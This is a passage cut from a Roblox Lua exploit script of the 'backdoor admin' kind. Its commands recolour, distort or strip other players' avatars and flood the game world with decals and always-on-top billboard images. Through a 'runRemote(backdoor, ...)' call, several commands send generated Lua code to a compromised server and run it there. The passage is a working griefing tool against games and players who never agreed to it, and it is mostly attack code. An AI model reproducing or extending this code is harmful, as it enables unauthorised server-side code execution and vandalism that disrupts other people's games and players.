		local localPlayer = game.Players.LocalPlayer
		if localPlayer then
			applyDiscoAvatar(localPlayer)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			applyDiscoAvatar(randomPlayer)
		end
	elseif target == "others" then
		local localPlayer = game.Players.LocalPlayer
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				applyDiscoAvatar(player)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			applyDiscoAvatar(player)
		end
	else
		local found = false
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				applyDiscoAvatar(player)
				found = true
				break
			end
		end
		if not found then
		end
	end

	if backdoor then
		local targetScript = ""

		if not target or target == "" or target == "me" then
			targetScript = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name == "%s" then
                        local character = v.Character
                        if character then
                            while true do
                                task.wait(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]], game.Players.LocalPlayer.Name, presets[math.random(1, #presets)])
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				targetScript = string.format([[
                    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                        if v:IsA("Player") and v.Name == "%s" then
                            local character = v.Character
                            if character then
                                while true do
                                    task.wait(0.5)
                                    for _, part in ipairs(character:GetChildren()) do
                                        if part:IsA("BasePart") then
                                            part.BrickColor = BrickColor.new("%s")
                                        end
                                    end
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name, presets[math.random(1, #presets)])
			end
		elseif target == "others" then
			targetScript = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name ~= "%s" then
                        local character = v.Character
                        if character then
                            while true do
                                task.wait(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]], game.Players.LocalPlayer.Name, presets[math.random(1, #presets)])
		elseif target == "all" then
			targetScript = [[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") then
                        local character = v.Character
                        if character then
                            while true do
                                task.wait(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                            if v:IsA("Player") and v.Name == "%s" then
                                local character = v.Character
                                if character then
                                    while true do
                                        task.wait(0.5)
                                        for _, part in ipairs(character:GetChildren()) do
                                            if part:IsA("BasePart") then
                                                part.BrickColor = BrickColor.new("%s")
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    ]], player.Name, presets[math.random(1, #presets)])
					break
				end
			end
		end

		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("headslide", "hslide", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	function applyHeadslide(player)
		if player and player.Character and player.Character:FindFirstChild("Torso") then
			for X = 1, math.huge, 0.1 do
				task.wait()
				local neck = player.Character.Torso:FindFirstChild("Neck")
				if neck then
					neck.C0 = CFrame.new(math.sin(X) / 1, 1.5, 0)
					neck.C1 = CFrame.new(0, 0, 0)
				end
			end

			for X = 1, math.huge, 0.07 do
				task.wait()
				local neck = player.Character.Torso:FindFirstChild("Neck")
				if neck then
					neck.C0 = CFrame.new(0, 1.5, 0) * CFrame.fromAxisAngle(Vector3.new(0, 1, 0), X)
					neck.C1 = CFrame.new(0, 0, 0)
				end
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			if localPlayer then
				applyHeadslide(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				applyHeadslide(randomPlayer)
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					applyHeadslide(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				applyHeadslide(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					applyHeadslide(player)
				end
			end
		end
	else
		local targetScript = [[
    local players = game:GetService("Players"):GetPlayers()
    local targetPlayers = {}
]]

		local localPlayer = game.Players.LocalPlayer

		if not target or target == "" or target == "me" then
			targetScript = targetScript .. string.format([[
        local localPlayer = game:GetService("Players"):FindFirstChild("%s")
        if localPlayer then
            table.insert(targetPlayers, localPlayer)
        end
    ]], localPlayer.Name)
		elseif target == "all" then
			targetScript = targetScript .. [[
        targetPlayers = players
    ]]
		elseif target == "random" then
			targetScript = targetScript .. [[
        table.insert(targetPlayers, players[math.random(1, #players)])
    ]]
		elseif target == "others" then
			targetScript = targetScript .. string.format([[
        local localPlayerName = "%s"
        for _, p in pairs(players) do
            if p.Name ~= localPlayerName then
                table.insert(targetPlayers, p)
            end
        end
    ]], localPlayer.Name)
		else
			targetScript = targetScript .. string.format([[
        local targetName = "%s"
        for _, p in pairs(players) do
            if string.find(string.lower(p.Name), string.lower(targetName)) then
                table.insert(targetPlayers, p)
            end
        end
    ]], target)
		end

		targetScript = targetScript .. [[
            for _, player in pairs(targetPlayers) do
                if player and player.Character and player.Character:FindFirstChild("Torso") then
                    coroutine.wrap(function()
                        for X = 1, math.huge, 0.1 do
                            task.wait()
                            local neck = player.Character.Torso:FindFirstChild("Neck")
                            if neck then
                                neck.C0 = CFrame.new(math.sin(X) / 1, 1.5, 0)
                                neck.C1 = CFrame.new(0, 0, 0)
                            end
                        end
                    end)()
                end
            end
        ]]

		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("meshdisco", "mdisco", function(target)
	local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	if not backdoor then
		local function applyMeshDisco(player)
			if player and player.Character then
				local character = player.Character
				local parts = {
					Head = character:FindFirstChild("Head"),
					Torso = character:FindFirstChild("Torso"),
					["Left Arm"] = character:FindFirstChild("Left Arm"),
					["Right Arm"] = character:FindFirstChild("Right Arm"),
					["Left Leg"] = character:FindFirstChild("Left Leg"),
					["Right Leg"] = character:FindFirstChild("Right Leg")
				}

				for _, part in pairs(parts) do
					if not part then return end
				end

				for _, part in pairs(parts) do
					if not part:FindFirstChild("Mesh") then
						Instance.new("SpecialMesh", part)
					end
				end

				task.spawn(function()
					while character.Parent do
						task.wait(0.1)
						for _, part in pairs(parts) do
							if part and part:FindFirstChild("Mesh") then
								part.Mesh.MeshType = meshes[math.random(1, #meshes)]
								part.BrickColor = BrickColor.Random()
							end
						end
					end
				end)
			end
		end

		if not target or target == "" or target == "me" then
			applyMeshDisco(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			applyMeshDisco(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					applyMeshDisco(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				applyMeshDisco(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					applyMeshDisco(player)
				end
			end
		end
		return
	end

	local targetScript = ""

	if not target or target == "" or target == "me" then
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            if player and player.Character then
                local parts = {
                    Head = player.Character:FindFirstChild("Head"),
                    Torso = player.Character:FindFirstChild("Torso"),
                    ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                    ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                    ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                    ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                }

                for _, part in pairs(parts) do
                    if not part then return end
                end

                for _, part in pairs(parts) do
                    if not part:FindFirstChild("Mesh") then
                        Instance.new("SpecialMesh", part)
                    end
                end

                task.spawn(function()
                    while player.Character and player.Character.Parent do
                        task.wait(0.1)
                        for _, part in pairs(parts) do
                            if part and part:FindFirstChild("Mesh") then
                                part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                part.BrickColor = BrickColor.Random()
                            end
                        end
                    end
                end)
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		targetScript = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            if player and player.Character then
                local parts = {
                    Head = player.Character:FindFirstChild("Head"),
                    Torso = player.Character:FindFirstChild("Torso"),
                    ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                    ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                    ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                    ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                }

                for _, part in pairs(parts) do
                    if not part then return end
                end

                for _, part in pairs(parts) do
                    if not part:FindFirstChild("Mesh") then
                        Instance.new("SpecialMesh", part)
                    end
                end

                task.spawn(function()
                    while player.Character and player.Character.Parent do
                        task.wait(0.1)
                        for _, part in pairs(parts) do
                            if part and part:FindFirstChild("Mesh") then
                                part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                part.BrickColor = BrickColor.Random()
                            end
                        end
                    end
                end)
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		targetScript = string.format([[
            local localPlayerName = "%s"
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player and player.Character then
                        local parts = {
                            Head = player.Character:FindFirstChild("Head"),
                            Torso = player.Character:FindFirstChild("Torso"),
                            ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                            ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                            ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                            ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                        }

                        for _, part in pairs(parts) do
                            if not part then goto continue end
                        end

                        for _, part in pairs(parts) do
                            if not part:FindFirstChild("Mesh") then
                                Instance.new("SpecialMesh", part)
                            end
                        end

                        task.spawn(function()
                            while player.Character and player.Character.Parent do
                                task.wait(0.1)
                                for _, part in pairs(parts) do
                                    if part and part:FindFirstChild("Mesh") then
                                        part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                        part.BrickColor = BrickColor.Random()
                                    end
                                end
                            end
                        end)
                        
                        ::continue::
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		targetScript = [[
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player and player.Character then
                    local parts = {
                        Head = player.Character:FindFirstChild("Head"),
                        Torso = player.Character:FindFirstChild("Torso"),
                        ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                        ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                        ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                        ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                    }

                    for _, part in pairs(parts) do
                        if not part then goto continue end
                    end

                    for _, part in pairs(parts) do
                        if not part:FindFirstChild("Mesh") then
                            Instance.new("SpecialMesh", part)
                        end
                    end

                    task.spawn(function()
                        while player.Character and player.Character.Parent do
                            task.wait(0.1)
                            for _, part in pairs(parts) do
                                if part and part:FindFirstChild("Mesh") then
                                    part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                    part.BrickColor = BrickColor.Random()
                                end
                            end
                        end
                    end)
                    
                    ::continue::
                end
            end
        ]]
	else
		targetScript = string.format([[
            local targetName = "%s"
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player and player.Character then
                        local parts = {
                            Head = player.Character:FindFirstChild("Head"),
                            Torso = player.Character:FindFirstChild("Torso"),
                            ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                            ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                            ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                            ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                        }

                        for _, part in pairs(parts) do
                            if not part then goto continue end
                        end

                        for _, part in pairs(parts) do
                            if not part:FindFirstChild("Mesh") then
                                Instance.new("SpecialMesh", part)
                            end
                        end

                        task.spawn(function()
                            while player.Character and player.Character.Parent do
                                task.wait(0.1)
                                for _, part in pairs(parts) do
                                    if part and part:FindFirstChild("Mesh") then
                                        part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                        part.BrickColor = BrickColor.Random()
                                    end
                                end
                            end
                        end)
                        
                        ::continue::
                    end
                end
            end
        ]], target)
	end

	if targetScript ~= "" then
		runRemote(backdoor, targetScript)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("accessoryless", "aless", function(target)
	function setAccessoryTransparency(player, transparency)
		if player and player.Character then
			local character = player.Character
			for _, accessory in pairs(character:GetChildren()) do
				if accessory:IsA("Accessory") then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						handle.Transparency = transparency
					end
				end
			end
		end
	end

	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		if localPlayer then
			setAccessoryTransparency(localPlayer, 1)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		setAccessoryTransparency(randomPlayer, 1)
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				setAccessoryTransparency(player, 1)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			setAccessoryTransparency(player, 1)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				setAccessoryTransparency(player, 1)
			end
		end
	end

	if backdoor then
		local targetScript = ""

		if not target or target == "" or target == "me" then
			targetScript = [[
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 1
                            end
                        end
                    end
                end
            ]]
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			targetScript = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 1
                            end
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			targetScript = string.format([[
                local localPlayerName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name ~= localPlayerName then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 1
                                    end
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        for _, accessory in pairs(player.Character:GetChildren()) do
                            if accessory:IsA("Accessory") then
                                local handle = accessory:FindFirstChild("Handle")
                                if handle then
                                    handle.Transparency = 1
                                end
                            end
                        end
                    end
                end
            ]]
		else
			targetScript = string.format([[
                local targetName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if string.find(string.lower(player.Name), string.lower(targetName)) then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 1
                                    end
                                end
                            end
                        end
                    end
                end
            ]], target)
		end

		if targetScript ~= "" then
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unaccessoryless", "unaless", function(target)
	function setAccessoryTransparency(player, transparency)
		if player and player.Character then
			local character = player.Character
			for _, accessory in pairs(character:GetChildren()) do
				if accessory:IsA("Accessory") then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						handle.Transparency = transparency
					end
				end
			end
		end
	end

	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		if localPlayer then
			setAccessoryTransparency(localPlayer, 0)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		setAccessoryTransparency(randomPlayer, 0)
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				setAccessoryTransparency(player, 0)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			setAccessoryTransparency(player, 0)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				setAccessoryTransparency(player, 0)
			end
		end
	end

	if backdoor then
		local targetScript = ""

		if not target or target == "" or target == "me" then
			targetScript = [[
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            ]]
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			targetScript = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			targetScript = string.format([[
                local localPlayerName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name ~= localPlayerName then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 0
                                    end
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			targetScript = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        for _, accessory in pairs(player.Character:GetChildren()) do
                            if accessory:IsA("Accessory") then
                                local handle = accessory:FindFirstChild("Handle")
                                if handle then
                                    handle.Transparency = 0
                                end
                            end
                        end
                    end
                end
            ]]
		else
			targetScript = string.format([[
                local targetName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if string.find(string.lower(player.Name), string.lower(targetName)) then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 0
                                    end
                                end
                            end
                        end
                    end
                end
            ]], target)
		end

		if targetScript ~= "" then
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("decalspam", "dspam", function(imageId)
	imageId = imageId

	function removeAllDecals(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("Decal") then
				v:Destroy()
			elseif v:IsA("BasePart") then
				for _, child in pairs(v:GetChildren()) do
					if child:IsA("Decal") then
						child:Destroy()
					end
				end
			end
			removeAllDecals(v)
		end
	end

	function applyDecalsToParts(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("BasePart") then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://" .. imageId
				Two.Texture = "rbxassetid://" .. imageId
				Three.Texture = "rbxassetid://" .. imageId
				Four.Texture = "rbxassetid://" .. imageId
				Five.Texture = "rbxassetid://" .. imageId
				Six.Texture = "rbxassetid://" .. imageId
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			applyDecalsToParts(v)
		end
	end

	function removeAllDecalsRecursively(root)
		for _, v in pairs(root:GetChildren()) do
			removeAllDecalsRecursively(v)
		end
	end

	if not backdoor then
		spawn(function()
			removeAllDecalsRecursively(game.Workspace)
			applyDecalsToParts(game.Workspace)
		end)
	end

	if backdoor then
		local targetScript = string.format([[
            local imageId = "%s"

            function removeAllDecals(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("Decal") then
                        v:Destroy()
                    elseif v:IsA("BasePart") then
                        for _, child in pairs(v:GetChildren()) do
                            if child:IsA("Decal") then
                                child:Destroy()
                            end
                        end
                    end
                    removeAllDecals(v)
                end
            end

            function applyDecalsToParts(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Material = "Plastic"
                        local One = Instance.new("Decal", v)
                        local Two = Instance.new("Decal", v)
                        local Three = Instance.new("Decal", v)
                        local Four = Instance.new("Decal", v)
                        local Five = Instance.new("Decal", v)
                        local Six = Instance.new("Decal", v)
                        One.Texture = "rbxassetid://" .. imageId
                        Two.Texture = "rbxassetid://" .. imageId
                        Three.Texture = "rbxassetid://" .. imageId
                        Four.Texture = "rbxassetid://" .. imageId
                        Five.Texture = "rbxassetid://" .. imageId
                        Six.Texture = "rbxassetid://" .. imageId
                        One.Face = "Front"
                        Two.Face = "Back"
                        Three.Face = "Right"
                        Four.Face = "Left"
                        Five.Face = "Top"
                        Six.Face = "Bottom"
                    end
                    applyDecalsToParts(v)
                end
            end

            removeAllDecals(game.Workspace)
            applyDecalsToParts(game.Workspace)
        ]], imageId)

		runRemote(backdoor, targetScript)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("batchdecalspam", "bdspam", function(imageId, batchSize, delayTime)
	batchSize = tonumber(batchSize) or 50
	delayTime = tonumber(delayTime) or 1

	if not imageId or not tonumber(imageId) then
		return
	end

	function removeAllDecals(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("Decal") then
				v:Destroy()
			elseif v:IsA("BasePart") then
				for _, child in pairs(v:GetChildren()) do
					if child:IsA("Decal") then
						child:Destroy()
					end
				end
			end
			removeAllDecals(v)
		end
	end

	local function applyDecalsInBatches(root, imageId, batchSize, delay)
		local partCount = 0
		local batchCount = 0

		local function countParts(r)
			for _, v in pairs(r:GetChildren()) do
				if v:IsA("BasePart") then
					partCount = partCount + 1
				end
				countParts(v)
			end
		end
		countParts(root)

		local function processBatch(r)
			local currentBatch = 0
			for _, v in pairs(r:GetChildren()) do
				if v:IsA("BasePart") then
					v.Material = "Plastic"
					local decals = {
						Front = Instance.new("Decal"),
						Back = Instance.new("Decal"),
						Right = Instance.new("Decal"),
						Left = Instance.new("Decal"),
						Top = Instance.new("Decal"),
						Bottom = Instance.new("Decal")
					}

					for face, decal in pairs(decals) do
						decal.Texture = "rbxassetid://" .. imageId
						decal.Face = Enum.NormalId[face]
						decal.Parent = v
					end

					currentBatch = currentBatch + 1
					batchCount = batchCount + 1

					if currentBatch >= batchSize then
						currentBatch = 0
						wait(delay)
					end
				end
				processBatch(v)
			end
		end

		processBatch(root)
	end

	if not backdoor then
		spawn(function()
			removeAllDecals(game.Workspace)
			applyDecalsInBatches(game.Workspace, imageId, batchSize, delayTime)
		end)
	end

	if backdoor then
		local targetScript = string.format([[
            local imageId = "%s"
            local batchSize = %d
            local delayTime = %f

            function removeAllDecals(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("Decal") then
                        v:Destroy()
                    elseif v:IsA("BasePart") then
                        for _, child in pairs(v:GetChildren()) do
                            if child:IsA("Decal") then
                                child:Destroy()
                            end
                        end
                    end
                    removeAllDecals(v)
                end
            end

            local function applyDecalsInBatches(root, imgId, batchSz, delay)
                local partCount = 0
                local batchCount = 0
                
                local function countParts(r)
                    for _, v in pairs(r:GetChildren()) do
                        if v:IsA("BasePart") then
                            partCount = partCount + 1
                        end
                        countParts(v)
                    end
                end
                countParts(root)
                
                local function processBatch(r)
                    local currentBatch = 0
                    for _, v in pairs(r:GetChildren()) do
                        if v:IsA("BasePart") then
                            v.Material = "Plastic"
                            local decals = {
                                Front = Instance.new("Decal"),
                                Back = Instance.new("Decal"),
                                Right = Instance.new("Decal"),
                                Left = Instance.new("Decal"),
                                Top = Instance.new("Decal"),
                                Bottom = Instance.new("Decal")
                            }
                            
                            for face, decal in pairs(decals) do
                                decal.Texture = "rbxassetid://" .. imgId
                                decal.Face = Enum.NormalId[face]
                                decal.Parent = v
                            end
                            
                            currentBatch = currentBatch + 1
                            batchCount = batchCount + 1
                            
                            if currentBatch >= batchSz then
                                currentBatch = 0
                                wait(delay)
                            end
                        end
                        processBatch(v)
                    end
                end
                
                processBatch(root)
            end

            removeAllDecals(game.Workspace)
            applyDecalsInBatches(game.Workspace, imageId, batchSize, delayTime)
        ]], imageId, batchSize, delayTime)

		runRemote(backdoor, targetScript)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("billboardspam", "bbspam", function(imageId)
	imageId = imageId

	function createBillboardGui(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addBillboardGuis()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA("BasePart") then
				createBillboardGui(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA("BasePart") then
				createBillboardGui(newDescendant)
			end
		end)
	end

	if not backdoor then
		spawn(function()
			addBillboardGuis()
		end)
	end

	if backdoor then
		local targetScript = string.format([[
            local imageId = "%s"

            function createBillboardGui(part)
                if part:FindFirstChildOfClass("BillboardGui") then return end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = part
                billboardGui.Adornee = part

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Image = "rbxassetid://" .. imageId
                imageLabel.BackgroundTransparency = 1
                imageLabel.Parent = billboardGui
            end

            function addBillboardGuis()
                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("BasePart") then
                        createBillboardGui(descendant)
                    end
                end

                workspace.DescendantAdded:Connect(function(newDescendant)
                    if newDescendant:IsA("BasePart") then
                        createBillboardGui(newDescendant)
                    end
                end)
            end

            addBillboardGuis()
        ]], imageId)

		runRemote(backdoor, targetScript)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("batchbillboardspam", "bbspam", function(imageId, batchSize, delayTime)
	batchSize = tonumber(batchSize) or 50
	delayTime = tonumber(delayTime) or 1

	if not imageId or not tonumber(imageId) then
		return
	end

	local function createBillboardGui(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Adornee = part

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui

		billboardGui.Parent = part
		return billboardGui
	end

	local function processBillboardsInBatches()
		local parts = {}
		local partCount = 0

		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA("BasePart") then
				table.insert(parts, descendant)
				partCount = partCount + 1
			end
		end

		local processed = 0
		for i, part in ipairs(parts) do
			createBillboardGui(part)
			processed = processed + 1

			if processed % batchSize == 0 then
				wait(delayTime)
			end
		end

	end

	local function setupLiveTracking()
		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA("BasePart") then
				createBillboardGui(newDescendant)
			end
		end)
	end

	if not backdoor then
		spawn(function()
			processBillboardsInBatches()
			setupLiveTracking()
		end)
	end

	if backdoor then
		local targetScript = string.format([[
            local imageId = "%s"
            local batchSize = %d
            local delayTime = %f

            local function createBillboardGui(part)
                if part:FindFirstChildOfClass("BillboardGui") then return end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Adornee = part

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Image = "rbxassetid://" .. imageId
                imageLabel.BackgroundTransparency = 1
                imageLabel.Parent = billboardGui

                billboardGui.Parent = part
                return billboardGui
            end

            local function processBillboardsInBatches()
                local parts = {}
                local partCount = 0
                
                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("BasePart") then
                        table.insert(parts, descendant)
                        partCount = partCount + 1
                    end
                end

